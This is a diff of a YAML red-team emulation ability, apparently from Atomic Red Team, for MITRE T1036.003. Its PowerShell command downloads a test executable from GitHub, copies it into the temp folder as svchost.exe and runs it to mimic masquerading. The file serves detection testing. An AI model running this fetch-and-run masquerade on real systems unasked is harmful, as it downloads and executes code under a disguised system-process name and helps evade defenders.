@@ -9,7 +9,7 @@
   tactic: stealth
   technique:
     attack_id: T1036.003
-    name: 'Masquerading: Rename System Utilities'
+    name: 'Masquerading: Rename Legitimate Utilities'
   platforms:
     windows:
       psh:
@@ -17,9 +17,10 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe") -ErrorAction ignore |
           Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe"
-          -OutFile "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe"; fi; copy "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe"
-          ($env:TEMP + "\svchost.exe"); try { $myT1036_003 = (Start-Process -PassThru
-          -FilePath ($env:TEMP + "\svchost.exe")).Id }; catch { $_; exit $_.Exception.HResult};
+          -OutFile "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe" -UseBasicParsing;
+          fi; copy "PathToAtomicsFolder\T1036.003\bin\T1036.003.exe" ($env:TEMP +
+          "\svchost.exe"); try { $myT1036_003 = (Start-Process -PassThru -FilePath
+          ($env:TEMP + "\svchost.exe")).Id }; catch { $_; exit $_.Exception.HResult};
           Stop-Process -ID $myT1036_003'
         cleanup: 'Remove-Item #{outputfile} -Force -ErrorAction Ignore'
   plugin: atomic
@@ -28,9 +29,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - stealth
   - t1036.003
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -53,9 +54,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe"
-        -OutFile "#{inputfile}"
+        -OutFile "#{inputfile}" -UseBasicParsing
 
         '
     technique_created: '2020-02-10T20:03:11.691Z'
     atomic_guid: bc15c13f-d121-4b1f-8c7d-28d95854d086
-    import_timestamp: '2026-10-20T07:08:26.855586Z'
+    import_timestamp: '2026-10-21T07:01:49.598301Z'
